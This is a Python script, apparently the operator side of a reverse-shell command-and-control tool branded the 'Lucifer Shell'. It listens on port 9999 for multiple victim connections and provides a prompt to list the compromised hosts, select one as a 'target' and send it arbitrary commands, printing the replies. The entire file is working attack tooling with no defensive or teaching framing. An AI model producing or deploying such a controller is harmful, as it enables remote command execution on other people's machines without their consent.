import socket
import threading
from queue import Queue

NO_OF_THREADS=2
JOB_NO=[1,2]
queue=Queue()
all_conn=[]
all_addresses=[]

#THREAD 1 operations
#Create socket

def sock_create():
    try:
        global host
        global port
        global s
        host=""
        port=9999
        s=socket.socket()
    except socket.error as msg:
        print("Socket creation error: "+str(msg))

#Bind Socket
def sock_bind():
    try:
        global host
        global port
        global s
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: "+str(msg)+"\n"+"Retrying......")
        sock_bind()

#Accept connections from multiple clients
def accept_con():
    for c in all_conn:
        c.close()#closing existing connections

    del all_conn[:]
    del all_addresses[:]
    while 1:
        try:
            conn,address=s.accept()
            conn.setblocking(1)#to prevent timeout
            all_conn.append(conn)
            all_addresses.append(address)
            print(" \n Connection established :"+address[0])
        except:
            print("Error accepting connections")

#THREAD 2 FUNCTIONS
#Interactive custom shell for sending commands remotely

def start_lucifer():
    while True:
        print("""       
        ██╗░░░░░ ██╗░░░██╗ ░█████╗ ░██╗ ███████╗ ███████╗ ██████╗░
        ██║░░░░░ ██║░░░██║ ██╔══██╗ ██║ ██╔════╝ ██╔════╝ ██╔══██╗
        ██║░░░░░ ██║░░░██║ ██║░░╚═╝ ██║ █████╗ ░░█████╗ ░░██████╔╝
        ██║░░░░░ ██║░░░██║ ██║░░██╗ ██║ ██╔══╝ ░░██╔══╝ ░░██╔══██╗
        ███████╗ ╚██████╔╝ ╚█████╔╝ ██║ ██║ ░░░░░███████╗ ██║░░██║
        ╚══════╝ ░╚═════╝ ░░╚════╝ ░╚═╝ ╚═╝ ░░░░░╚══════╝ ╚═╝░░╚═╝
           """)
        print("---------------Welcome to the Lucifer Shell----------------")
        cmd=input("lucifer> ")
        if cmd=="list":
            list_connections()#method to list out all connected hosts
        elif "select" in cmd:
            conn=get_target(cmd)#Select a target
            if conn is not None:
                send_target_cmds(conn)
        else:
            print("Command not recognized!!")

#displays all connected hosts
def list_connections():
    results=""
    for i,conn in enumerate(all_conn):
        try:
            conn.send(str.encode(' '))  # sending blank message to check if connection is working
            conn.recv(20480)
        except:
            del all_conn[i]
            del all_addresses[i]
            continue
        results += str(i)+" "+str(all_addresses[i][0])+" "+str(all_addresses[i][1])+"\n"
    print("-------------Clients--------------"+"\n"+results)

#select target
def get_target(cmd):
    try:
        target = cmd.replace("select ", "")
        target = int(target)
        conn = all_conn[target]
        print("You are now connected to: " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0])+">",end="")
        return conn
    except:
        print("Not a valid selection")
        return None

#Connect with remote target
def send_target_cmds(conn):
    while True:
        try:
            cmd=input()
            if len(str.encode(cmd))>0:
                conn.send(str.encode(cmd))
                client_resp=str(conn.recv(20480),"utf-8")
                print(client_resp,end="")
            if cmd=="quit":
                break
        except:
            print("Connection was lost")
            break

#create worker threads
def create_workers():
    for _ in range(NO_OF_THREADS):
        t=threading.Thread(target=work)
        t.daemon=True
        t.start()

#Each list item is a new job
def create_jobs():
    for x in JOB_NO:
        queue.put(x)
    queue.join()

#Do the next job in the queue
def work():
    while True:
        x=queue.get()
        if x==1:
            sock_create()
            sock_bind()
            accept_con()
        if x==2:
            start_lucifer()
        queue.task_done()

create_workers()
create_jobs()



